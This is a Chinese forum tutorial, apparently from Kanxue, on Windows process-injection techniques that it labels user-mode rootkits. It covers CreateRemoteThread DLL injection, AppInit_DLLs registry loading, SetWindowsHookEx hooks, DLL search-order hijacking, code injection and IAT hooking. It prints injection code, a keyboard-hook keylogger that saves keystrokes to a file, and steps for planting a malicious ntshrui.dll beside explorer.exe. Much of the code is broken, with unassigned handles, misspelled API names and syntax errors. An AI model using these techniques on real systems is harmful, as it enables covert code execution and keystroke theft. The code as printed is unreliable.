
# [原创]几种常见的注入姿势

来到看雪也快1年了，非常喜欢这个圈子，大家可以一起学习技术，希望看雪也能越来越好吧！

**在厚颜无耻的求波文化衫。言归正传：**

这篇原来是我博客里面的东西，标题是用户态下的Rootkit技术，其实说到Rootkit，心里还是非常慌张的，因为这些只是普通的注入和hook，但是有些书上是这样写的，所以呢，我在厚颜无耻的给他冠以更加高级的名字---Rootkit，因为博客直接是markdown写的，今天刚刚写完一套四级(原谅我就是这样菜)，时间不是很早了，所以直接就粘贴复制了，如果有排版错误，我在修改修改！，小小小菜鸟一枚，欢迎各位师傅指正。本文的参考来源我附在最后一部分了。

## 第一部分：Rootkit技术

Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这些技术都是把恶意代码注入到进程（线程）中，一般用`procexp`能看到。

## 第二部分：DLL注入

### DLL注入的第一种方法：`CreateRemoteThread`远程线程调用

DLL注入是指向某一个特定的进程空间强制插入一个特定的DLL文件映像，值得注意的是这种插入是强制性的插入，从技术层面来看，**DLL注入是利用`LoadLibrary()`加载特定的DLL文件到进程的内存空间。**注入的对象是可以是自身，也可以是远程进程。DLL注入技术实现主要分为5个部分，

- **第一步打开进程，获取进程的句柄，**
- **第二歩是在内存空间开辟一段内存空间，**
- **第三步是向刚刚开辟的内存中写入需要注入DLL的路径，**
- **第四步是利用`GetProcessAddree()`获取`LoadLibrary()`的地址，**
- **第五步是调用远程线程，利用`LoadLibrary()`去加载DLL。**

```
bool InjectDll(DWORD dwPID, LPCTSTR szDLLPath)
{
HANDLE hProcess = NULL,hThread=NULL;
DWORD BufSize = (DWORD)(_tcslen(szDLLPath) + 1) * sizeof(TCHAR);
/*-------------打开需要注入的进程-------------*/
if (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))
{
printf("OpenProcess(%d) Open Fail:[%d]", dwPID, GetLastError());
return 0;
}
/*------------向目标进程开辟内存空间-----------*/
LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, BufSize, MEM_COMMIT, PAGE_READWRITE);
/*------------将目标路径写入进程---------------*/
WriteProcessMenory(hProcess, pRemoteBuf, (LPVOID)szDLLPath, BufSize, NULL);
/*-----------获取LoadLibrary地址--------------*/
HMODULE hMod = GetModuleHandle(L"kenerl32.dll");
pThreadProc = GetAddress(hMod, "LoadLibrary");
/*------------调用远程线程加载DLL--------------*/
hThread = CreateRemoteThread(hProcess,
NULL,
0,
pThreadProc, //远程线程LaodLibrary
pRemoteBuf, //参数，DLL的路径
0,
NULL);
CloseHandle(hProcess);
CloseHandle(hThread);
return 1;
}
```

反编译如下：

- 打开进程
- 设置进程内存空间
- 调用`CreateRemoteThread`实现注入

### DLL注入的第二种方法：利用注册表注入

利用`APPiNIT_dll`注册表来实现DLL注入。因为windows允许只要加载了`USER32.dll`的进程并且，某一个dll的绝对路径处于注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`中，os就会自动去加载位于该注册表的有效的DLL。所以只需要在注册表`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs`中添加DLL的绝对路径，并把数值改为1，可以使得所有加载`USER32.dll`的进程全部加载目标路径的DLL。

利用`AppCertDlls`注册表，将`HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls`下写入dll的路径，可以将此注册表项下的DLL加载到调用`CreateProcess`、`CreateProcessAsUser`、`CreateProcessWithLogonW`、`CreateProcessWithTokenW`和`WinExec`的每个进程中。**值得注意的是win xp-win 10默认不存在这个注册表项。**

### DLL注入的第三种方法：`SetWindowsHookEx()`设置钩子

利用windows的消息机制，可以在事件发送到os之间设置一条钩链，来钩取不同的消息，如以下代码，利用`SetWindowsHookEx()`可以钩取一个键盘消息。并且调用钩子处理函数来处理这个消息，所达到的效果和dll注入是一样的（执行dll内部的代码）。

```
extern "C" _declspec(dllexport) void HookStart()
{
g_hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, GetModuleHandle(TEXT("消息钩取(DLL注入）实验.dll")), 0);
if (g_hHook == NULL)
MessageBox(NULL, TEXT("提示"), MB_OKCANCEL);
}
```

钩子函数要使用回调函数，这样可以重复钩取消息。

```
LRESULT CALLBACK HookProc(int ncode, WPARAM wParam, LPARAM lParam)
{
FILE *fp; //做文件的写入工作
TCHAR key[20];
const TCHAR *k = NULL;
TCHAR *p = NULL;
if (ncode >= 0) //ncode 大于等于0，操作有效
{
if (!(lParam & 0x80000000))//出现按键消息
{
GetKeyNameText(lParam,key,20);//检索键名的字符串
int state = GetKeyState(VK_CAPITAL);//指定大小写的状态，返回值是1或者0
int asyncState = GetAsyncKeyState(VK_SHIFT);//指定函数调用时候
if (lstrlen(key) == 1) //只出现一个按键
{
if (asyncState < 0) //未上档
{
for (int i = 0; i < 22; i++)
{
if (KeyUn[i] == key[0])
{
key[0] = KeyUn[i];
break;
}
}
if (k == NULL&&state > 0) //小写状态
{
if (wParam >= 65 && wParam <= 90)
key[0] += 32; //转化为ASCII小写
}
}
else //小写状态
{
if (k == NULL&&state == 0)
{
if (wParam >= 65 && wParam <= 90)
key[0] += 32; //转化为小写
}
}
k = &key[0]; //k指向缓冲区的地址
}
}
else if (lstrlen(key) == 5)
{
if (key[0] == TEXT('N') && key[1] == TEXT('u') && key[2] == TEXT('m') && key[3] == TEXT(' '))
k = &key[4];
}
if (k != NULL)
{
lstrcat(str,k);
//FlushBuffer();
/*HANDLE hf = CreateFile(TEXT("C:/数据.txt"), GENERIC_READ | GENERIC_WRITE,
0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (!GetProcessId(NULL))
ErrorExit(TEXT("GetProcessId"));
DWORD written;
WriteFile(hf, str, sizeof(str), &written, 0);
CloseHandle(hf);*/
fp = fopen("E:/学习/C语言/Viusal Studio/消息钩取（DLL注入）实验--注入工具（GUI）/消息钩取（DLL注入）实验--注入工具（GUI）/抓取的数据.txt", "wt");
//fprintf(fp, "%s", str);
//fwrite(str,sizeof(str),1,fp)
if(fwrite(str, sizeof(str), 1, fp)!=1)
MessageBox(NULL, TEXT("文件写入失败"), TEXT("提示"), MB_OKCANCEL);
fclose(fp);
}
}
//如果没有找到notepad的进程，将消息传递给下一个钩子
return CallNextHookEx(g_hHook, ncode, wParam, lParam);
}
```

### DLL注入的第四种方法：DLL搜索劫持技术（也称DLL加载顺序挟持）[DLL Search Order Hijacking]

dll搜索劫持技术是一种简单的dll注入技术，他利用windows加载dll目录的优先级来加载dll。他不需要通过修改注册表或者修改二进制文件的前提下注入dll。下面是windows加载dll的默认搜索顺序：

1. 加载应用程序的目录
2. 当前目录【经常利用到】
3. 系统目录（`../windows/system32`）
4. 16位子系统目录（`../windows/system`）
5. windows目录（`../windows`）
6. `PATH`环境变量列举的目录

说明：为了安全和加载速度，windows会在`HKML\System\CurrentSet\SessionManger\SafeDll\SafeDllSearchMode`下创建键值，系统会优先加载这些已知的dll（第一位）。

我们通过两个方面来进行劫持：

1. 通过在上述注册表中添加恶意dll路径的键值，这样使得恶意dll优先注入到进程空间（这个恶意dll需要和系统dll同名）。
2. 在加载系统dll之前加载。

有权访问文件系统的攻击者可能会将恶意`ntshrui.dll`放在`C:\Windows`目录中。该DLL通常驻留在`System32`文件夹中。进程`explorer.exe`也驻留在`c:\Windows`中，一旦尝试从`System32`文件夹中加载`ntshrui.dll`，实际上会由于优先搜索顺序而加载由攻击者提供的DLL。由于攻击者已将其恶意`ntshrui.dll`放入与加载`explorer.exe`进程相同的目录中，因此将首先找到攻击者提供的DLL，从而加载代替合法DLL。由于`explorer.exe`在引导周期内被加载，攻击者的恶意软件被保证执行。【不是书上说的`../windows`比系统目录优先搜索，而是当前目录比系统目录被优先搜索】

如果启用windows的DLL安全检查，情况可能会大有改观。

启用“安全DLL查找模式”时，查找顺序如下：

1. 应用程序所在目录；
2. 系统目录。`GetSystemDirectory()`返回的目录，通常是系统盘`\Windows\System32`；
3. 16位系统目录；
4. Windows目录。`GetWindowsDirectory()`返回的目录，通常是系统盘`\Windows`；
5. 当前目录。`GetCurrentDirectory()`返回的目录；
6. 环境变量`PATH`中所有目录。

## 第三部分：代码注入

代码注入是一种向进程中插入一段独立运行的代码并且不会影响进程的运行（如崩溃）的技术，从技术上讲他也是调用`CreateRemoteThread()`来注入远程代码。分两次向进程中注入，第一次以远程线程的形式注入，第二次以线程参数的形式注入远程进程。

```
DWORD WINAPI ThreadProc()
{
//需要注入的代码
}
BOOL InjectCode(DWORD pId)
{
PHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID));
dwsize = sizeof(THREADPARAM); //插入代码所需要数据的大小
pRemoteBuf[0] = VirtualAllocEx(); //在进程空间开辟一个数据大小相同的空间
WriteProcessMenory(hProcess, pRemoteBuf[0], &param, dwsize, NULL);//将注入代码所需要的数据写入进程空间
dwsize = (dword)InjectCode() - (dword)ThreadProc();//插入代码需要的空间大小
pRemoteBuf[0] = VirtualAllocEx(); //在进程中开辟等大小的空间用于存储代码
WriteProcessMenory(hProcess, pRemoteBuf[0], (LPVOID)ThreadProc(), dwsize, NULL);
hTread = CreateRemoteThread(hProcess,
NULL,
0,
pRemoteBuf[1], //注入的代码
pRemoteBuf[0], //代码所需要的数据作为代码的参数传入
0, NULL);
CloseHandle(hProcess);
CloseHandle(hThread);
}
```

反编译如下：

- 复制代码所需数据
- 打开目标进程：
- 开辟内存空间，为了存储数据
- 写入数据
- 开辟进程空间，为了存储代码
- 写入代码
- 调用`CreateRemoteThread()`进行代码注入

## 第四部分：HOOK技术

HOOK叫做钩取（钩子），他的原理是：windows系统分为用户态和内核态，在用户态中需要访问一些敏感的数据（网络、文件资源等）就必须要调用windowsAPI函数，来与kernel沟通获得该资源的使用权。钩子便可以在调用API函数的时候，在调用之前（`IAT_HOOK`）或者之后发挥作用，这样恶意软件便不需要创建一个进程就可以实现某些恶意的功能，便达到了隐藏自身的作用。

### 1. `IAT_HOOK`技术【复杂且不友好】

在一个windows应用程序中，人们所编写的代码所占的比例不到20%，其他都是导入的是库文件（windows下主要是dll文件），dll文件的存在大大简化了人们的工作，同样的也减少了程序所运行的成本，因为在一个dll文件中不是所有函数都会被使用。在`.exe`文件中存在一个叫做`IAT`（导入地址表）的表，这个表存在的原因就是便于程序去dll文件中寻找特定的函数。

一个正常的`.exe`使用`IAT`的过程如下：程序调用了某个dll中的函数，首先去程序自带的`IAT`中寻找该函数在dll中所处的地址，然后调用一个`jmp`跳转到`dll!FUN()`所在的地址，继续执行。【windows加载器会在程序运行时把dll中函数的地址存储在`IAT`中，当然程序第一个调用的是`IAT`的地址】

![](upload/attach/201902/3_GCBEEGQTT78MUV9.png)

如果程序被`IAT_HOOK`的话，过程是这样的。首先先使用DLL注入把含有恶意代码的DLL注入到进程内部，并修改`IAT`数据，程序和正常过程一样调用`IAT`的地址，但是此时`IAT`的函数地址并不是正常的函数地址，`jmp`到恶意的函数中执行，执行完恶意代码后`call`到正常的dll中，然后`retn`。
